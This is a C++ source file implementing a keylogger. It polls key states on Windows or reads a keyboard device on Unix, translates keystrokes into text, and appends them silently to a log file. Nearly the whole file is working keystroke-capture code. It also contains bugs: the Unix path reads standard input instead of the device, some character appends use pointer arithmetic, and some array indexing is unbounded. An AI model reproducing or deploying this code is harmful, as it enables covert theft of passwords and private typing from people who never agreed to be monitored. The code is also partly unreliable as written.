#include <iostream>
#include <fstream>
#include "keylog.h"
#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
#include <windows.h>
#include <windowsx.h>
#define MAX_VALUE 94
#elif __unix__ 
#include <sys/types.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#define MAX_VALUE 127
#endif // macros defined by cpp (C prprocessor)

using namespace std;

vcodes& operator++(vcodes& e) {
    switch(e) {
        case vcodes::VC_TAB:
        e = vcodes(0x0C);
        break;
        case vcodes::VC_RETURN:
        e = vcodes(0x10);
        break;
        case vcodes::VC_CAPITAL:
        e = vcodes(0x1B);
        break;
        case vcodes::VC_ESCAPE:
        e = vcodes(0x20);
        break;
        case vcodes::VC_9:
        e = vcodes(0x41);
        break;
        case vcodes::VC_APPS:
        e = vcodes(0x5F);
        break;
        case vcodes::VC_DIVIDE:
        e = vcodes(0xBB);
        break;
        case vcodes::VC_OEM_3:
        e = vcodes(0xDB);
        break;
        case vcodes::VC_OEM_8:
        e = vcodes(0xFE);
        break;
        case END:
        throw std::out_of_range("vcodes operator++");
        default:
        e = vcodes(static_cast<std::underlying_type<vcodes>::type>(e) + 1);
    }
    return e;
} // operator++

vcodes convert(int x) {
    vcodes v;
    switch (x) {
        case set3::SET3_BACK:
        v = vcodes::VC_BACK;
        break;
        case set3::SET3_TAB:
        v = vcodes::VC_TAB;
        break;
        case set3::SET3_RETURN:
        v = vcodes::VC_RETURN;
        break;
        case set3::SET3_LSHIFT:
        case set3::SET3_RSHIFT:
        v = vcodes::VC_SHIFT;
        break;
        case set3::SET3_LCONTROL:
        case set3::SET3_RCONTROL:
        v = vcodes::VC_CONTROL;
        break;
        case set3::SET3_LALT:
        case set3::SET3_RALT:
        v = vcodes::VC_MENU;
        break;
        case set3::SET3_PAUSE:
        v = vcodes::VC_PAUSE;
        break;
        case set3::SET3_CAPITAL:
        v = vcodes::VC_CAPITAL;
        break;
        case set3::SET3_ESCAPE:
        v = vcodes::VC_ESCAPE;
        break;
        case set3::SET3_SPACE:
        v = vcodes::VC_SPACE;
        break;
        case set3::SET3_END:
        v = vcodes::VC_END;
        break;
        case set3::SET3_HOME:
        v = vcodes::VC_HOME;
        break;
        case set3::SET3_LEFT:
        v = vcodes::VC_LEFT;
        break;
        case set3::SET3_UP:
        v = vcodes::VC_UP;
        break;
        case set3::SET3_RIGHT:
        v = vcodes::VC_RIGHT;
        break;
        case set3::SET3_DOWN:
        v = vcodes::VC_DOWN;
        break;
        case set3::SET3_PRINT:
        v = vcodes::VC_PRINT;
        break;
        case set3::SET3_INSERT:
        v = vcodes::VC_INSERT;
        break;
        case set3::SET3_DELETE:
        v = vcodes::VC_DELETE;
        break;
        case set3::SET3_0:
        v = vcodes::VC_0;
        break;
        case set3::SET3_1:
        v = vcodes::VC_1;
        break;
        case set3::SET3_2:
        v = vcodes::VC_2;
        break;
        case set3::SET3_3:
        v = vcodes::VC_3;
        break;
        case set3::SET3_4:
        v = vcodes::VC_4;
        break;
        case set3::SET3_5:
        v = vcodes::VC_5;
        break;
        case set3::SET3_6:
        v = vcodes::VC_6;
        break;
        case set3::SET3_7:
        v = vcodes::VC_7;
        break;
        case set3::SET3_8:
        v = vcodes::VC_8;
        break;
        case set3::SET3_9:
        v = vcodes::VC_9;
        break;
        case set3::SET3_A:
        v = vcodes::VC_A;
        break;
        case set3::SET3_B:
        v = vcodes::VC_B;
        break;
        case set3::SET3_C:
        v = vcodes::VC_C;
        break;
        case set3::SET3_D:
        v = vcodes::VC_D;
        break;
        case set3::SET3_E:
        v = vcodes::VC_E;
        break;
        case set3::SET3_F:
        v = vcodes::VC_F;
        break;
        case set3::SET3_G:
        v = vcodes::VC_G;
        break;
        case set3::SET3_H:
        v = vcodes::VC_H;
        break;
        case set3::SET3_I:
        v = vcodes::VC_I;
        break;
        case set3::SET3_J:
        v = vcodes::VC_J;
        break;
        case set3::SET3_K:
        v = vcodes::VC_K;
        break;
        case set3::SET3_L:
        v = vcodes::VC_L;
        break;
        case set3::SET3_M:
        v = vcodes::VC_M;
        break;
        case set3::SET3_N:
        v = vcodes::VC_N;
        break;
        case set3::SET3_O:
        v = vcodes::VC_O;
        break;
        case set3::SET3_P:
        v = vcodes::VC_P;
        break;
        case set3::SET3_Q:
        v = vcodes::VC_Q;
        break;
        case set3::SET3_R:
        v = vcodes::VC_R;
        break;
        case set3::SET3_S:
        v = vcodes::VC_S;
        break;
        case set3::SET3_T:
        v = vcodes::VC_T;
        break;
        case set3::SET3_U:
        v = vcodes::VC_U;
        break;
        case set3::SET3_V:
        v = vcodes::VC_V;
        break;
        case set3::SET3_W:
        v = vcodes::VC_W;
        break;
        case set3::SET3_X:
        v = vcodes::VC_X;
        break;
        case set3::SET3_Y:
        v = vcodes::VC_Y;
        break;
        case set3::SET3_Z:
        v = vcodes::VC_Z;
        break;
        case set3::SET3_NUMPAD0:
        v = vcodes::VC_NUMPAD0;
        break;
        case set3::SET3_NUMPAD1:
        v = vcodes::VC_NUMPAD1;
        break;
        case set3::SET3_NUMPAD2:
        v = vcodes::VC_NUMPAD2;
        break;
        case set3::SET3_NUMPAD3:
        v = vcodes::VC_NUMPAD3;
        break;
        case set3::SET3_NUMPAD4:
        v = vcodes::VC_NUMPAD4;
        break;
        case set3::SET3_NUMPAD5:
        v = vcodes::VC_NUMPAD5;
        break;
        case set3::SET3_NUMPAD6:
        v = vcodes::VC_NUMPAD6;
        break;
        case set3::SET3_NUMPAD7:
        v = vcodes::VC_NUMPAD7;
        break;
        case set3::SET3_NUMPAD8:
        v = vcodes::VC_NUMPAD8;
        break;
        case set3::SET3_NUMPAD9:
        v = vcodes::VC_NUMPAD9;
        break;
        case set3::SET3_MULTIPLY:
        v = vcodes::VC_MULTIPLY;
        break;
        case set3::SET3_ADD:
        v = vcodes::VC_ADD;
        break;
        case set3::SET3_SEPARATOR:
        v = vcodes::VC_SEPARATOR;
        break;
        case set3::SET3_SUBTRACT:
        v = vcodes::VC_SUBTRACT;
        break;
        case set3::SET3_DECIMAL:
        v = vcodes::VC_DECIMAL;
        break;
        case set3::SET3_DIVIDE:
        v = vcodes::VC_DIVIDE;
        break;
        case set3::SET3_OEM_1:
        v = vcodes::VC_OEM_1;
        break;
        case set3::SET3_OEM_PLUS:
        v = vcodes::VC_OEM_PLUS;
        break;
        case set3::SET3_OEM_COMMA:
        v = vcodes::VC_OEM_COMMA;
        break;
        case set3::SET3_OEM_MINUS:
        v = vcodes::VC_OEM_MINUS;
        break;
        case set3::SET3_OEM_PERIOD:
        v = vcodes::VC_OEM_PERIOD;
        break;
        case set3::SET3_OEM_2:
        v = vcodes::VC_OEM_2;
        break;
        case set3::SET3_OEM_3:
        v = vcodes::VC_OEM_3;
        break;
        case set3::SET3_OEM_4:
        v = vcodes::VC_OEM_4;
        break;
        case set3::SET3_OEM_5:
        v = vcodes::VC_OEM_5;
        break;
        case set3::SET3_OEM_6:
        v = vcodes::VC_OEM_6;
        break;
        case set3::SET3_OEM_7:
        v = vcodes::VC_OEM_7;
        break;
        case set3::SET3_OEM_8:
        v = vcodes::VC_OEM_8;
        break;
    } // switch
    return v;
}

vector<vcodes> getPressedKeyboardState(string path) {
    vector<vcodes> pressed;
    static bool ar[MAX_VALUE];
    static bool capsLoc = false;
    #if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    int x = 0;
    for (vcodes v = vcodes::VC_BACK; v != END; ++v) {
        bool p = (GetAsyncKeyState(v) & 0x8000);
        if (v == vcodes::VC_CAPITAL) {
            if (p && !ar[x]) {
                capsLoc = !capsLoc;
                ar[x] = true;
            } else if (!p) {
                ar[x] = false;
            }
            if (capsLoc) {
                pressed.push_back(v);
            }
            continue;
        }
        if (p && (!ar[x] || (v >= vcodes::VC_SHIFT && v <= vcodes::VC_MENU))) {
            ar[x] = true;
            pressed.push_back(v);
        } else if (!p) {
            ar[x] = false;
        }
        x++;
    }
    #elif __unix__
    ifstream keyboard{path};
    if (!keyboard) {
        cerr << "path is incorrect.\n";
        return pressed;
    }
    keyboard.setf(ios::hex);
    int x = 0;
    int last = 0;
    while (!keyboard.eof()) {
        last = x;
        cin >> x;
        vcodes v = convert(x);
        if (v == vcodes::VC_CAPITAL) {
            if (!ar[0]) {
                capsLoc = !capsLoc;
                ar[0] = true;
            } else if (last == 0xF0) {
                ar[0] = false;
            }
            if (capsLoc) {
                pressed.push_back(v);
            }
        } else {
            bool l = ar[x];
            ar[x] = (last == 0xF0) ? false : true;
            if (!l && ar[x]) {
                pressed.push_back(v);
            }
        }
    }
    #endif
    return pressed;
} // getAsyncKeyboardState

static bool contains(vector<vcodes> pr, vcodes v) {
    for (auto vc = pr.begin(); vc != pr.end(); ++vc) {
        if (*vc == v) {
            return true;
        }
    }
    return false;
}

string getAscii(vector<vcodes> pressed) {
    bool shift = contains(pressed, vcodes::VC_SHIFT);
    bool capslock = contains(pressed, vcodes::VC_CAPITAL);
    bool alt = contains(pressed, vcodes::VC_MENU);
    string str;
    for(auto vc = pressed.begin(); vc != pressed.end(); ++vc) {
        if ((*vc >= vcodes::VC_0 && *vc <= vcodes::VC_9) || (*vc >= vcodes::VC_NUMPAD0 && *vc <= vcodes::VC_NUMPAD9)) {
            if (shift) {
                switch (*vc) {
                    case vcodes::VC_NUMPAD0:
                    case vcodes::VC_0:
                    str += ")";
                    break;
                    case vcodes::VC_NUMPAD1:
                    case vcodes::VC_1:
                    str += "!";
                    break;
                    case vcodes::VC_NUMPAD2:
                    case vcodes::VC_2:
                    str += "@";
                    break;
                    case vcodes::VC_NUMPAD3:
                    case vcodes::VC_3:
                    str += "#";
                    break;
                    case vcodes::VC_NUMPAD4:
                    case vcodes::VC_4:
                    str += "$";
                    break;
                    case vcodes::VC_NUMPAD5:
                    case vcodes::VC_5:
                    str += "%";
                    break;
                    case vcodes::VC_NUMPAD6:
                    case vcodes::VC_6:
                    str += "^";
                    break;
                    case vcodes::VC_NUMPAD7:
                    case vcodes::VC_7:
                    str += "&";
                    break;
                    case vcodes::VC_NUMPAD8:
                    case vcodes::VC_8:
                    str += "*";
                    break;
                    case vcodes::VC_NUMPAD9:
                    case vcodes::VC_9:
                    str += "(";
                    break;
                    default:
                    str += "";
                }
            } else {
                str += (char)*vc;
            }
        } else if (*vc >= vcodes::VC_A && *vc <= vcodes::VC_Z) {
            str += ((shift && !capslock) || (!shift && capslock))? (char)*vc : (char)(*vc + 32);
        } else if (*vc >= vcodes::VC_MULTIPLY) {
            switch (*vc) {
                case vcodes::VC_MULTIPLY:
                str += "*";
                break;
                case vcodes::VC_OEM_1:
                str += (shift)? ":" : ";";
                break;
                case vcodes::VC_DIVIDE:
                case vcodes::VC_OEM_2:
                str += (shift)? "?" : "/";
                break;
                case vcodes::VC_OEM_3:
                str += (shift)? "~" : "`";
                break;
                case vcodes::VC_OEM_4:
                str += (shift)? "{" : "[";
                break;
                case vcodes::VC_SEPARATOR:
                case vcodes::VC_OEM_5:
                str += (shift)? "|" : "\\";
                break;
                case vcodes::VC_OEM_6:
                str += (shift)? "}" : "]";
                break;
                case vcodes::VC_OEM_7:
                str += (shift)? "\"" : "\'";
                break;
                case vcodes::VC_OEM_8:
                str += (shift)? "" : "";
                break;
                case vcodes::VC_OEM_COMMA:
                str += (shift)? "<" : ",";
                break;
                case vcodes::VC_OEM_CLEAR:
                str += (shift)? "" : "";
                break;
                case vcodes::VC_DECIMAL:
                case vcodes::VC_OEM_PERIOD:
                str += (shift)? ">" : ".";
                break;
                case vcodes::VC_ADD:
                case vcodes::VC_OEM_PLUS:
                str += (shift)? "+" : "=";
                break;
                case vcodes::VC_SUBTRACT:
                case vcodes::VC_OEM_MINUS:
                str += (shift)? "_" : "-";
                break;
                default:
                str += "";
            }
        } else if (*vc >= vcodes::VC_BACK && *vc <= vcodes::VC_DELETE) {
            switch (*vc) {
                case vcodes::VC_BACK:
                str += "\b";
                break;
                case vcodes::VC_TAB:
                str += "\t";
                break;
                case vcodes::VC_RETURN:
                str += "\n";
                break;
                case vcodes::VC_ESCAPE:
                str += "" + (char)27;
                break;
                case vcodes::VC_SPACE:
                str += " ";
                break;
                case vcodes::VC_DELETE:
                str += "" + (char)127;
                break;
                default:
                str += "";
            }
        }
    }
    return str;
} // getAscii



void writeToFile(string file, string s) {
    static ofstream outFile{file, std::ios::app | std::ios::out};
    if (s.empty()) {
        return;
    }
    if (!outFile.is_open()) {
        cerr << "Cannot find " << file << endl;
        return;
    }
    outFile << s;
    outFile.flush();
} // writeToFile